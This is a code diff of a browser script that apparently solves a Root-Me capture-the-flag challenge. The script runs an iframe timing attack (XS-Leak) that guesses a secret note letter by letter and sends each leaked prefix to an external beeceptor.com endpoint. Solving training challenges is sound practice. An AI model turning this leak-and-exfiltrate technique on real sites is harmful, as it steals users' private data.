@@ -25,7 +25,7 @@
     <pre id="log"></pre> <!-- Display loading times -->
 
     <script>
-        const start = 3050;
+        const start = 0;
         const end = 3070;
         const iframe = document.getElementById('iframe');
         const status = document.getElementById('status');
@@ -79,7 +79,7 @@
             };
         }
 
-        function startSearch(id, searchStr) {
+        function startSearch(id, searchStr, hit = false) {
             const url = `https://web-client-ch56.challenge01.root-me.org:58056/notes/${id}/${searchStr}`;
             status.textContent = `Searching: ${url}`;
 
@@ -90,21 +90,25 @@
                 const endTime = performance.now();
                 const loadTime = Math.round(endTime - startTime);
 
-                if (loadTime > 500) {
+                if (loadTime > 1000) {
                     lastValidUrl = url;
-                    startSearch(id, searchStr + alphabet[0]); // Add a new letter
+                    startSearch(id, searchStr + alphabet[0], true); // Add a new letter
                 } else {
                     // Move to the next letter in the alphabet
                     let nextQuery = getNextQuery(searchStr);
                     if (nextQuery) {
-                        startSearch(id, nextQuery);
+                        startSearch(id, nextQuery, hit);
                     } else {
-                        fetch("https://rootmexsleak.free.beeceptor.com/" + searchStr);
-
                         searchStr = searchStr.slice(0, -1);
+
+                        if (hit) {
+                            hit = false;
+                            fetch("https://rootmexsleak.free.beeceptor.com/" + searchStr);
+                        }
+
                         nextQuery = getNextQuery(searchStr);
                         if (nextQuery) {
-                            startSearch(id, nextQuery);
+                            startSearch(id, nextQuery, hit);
                         } else {
                             return;
                         }
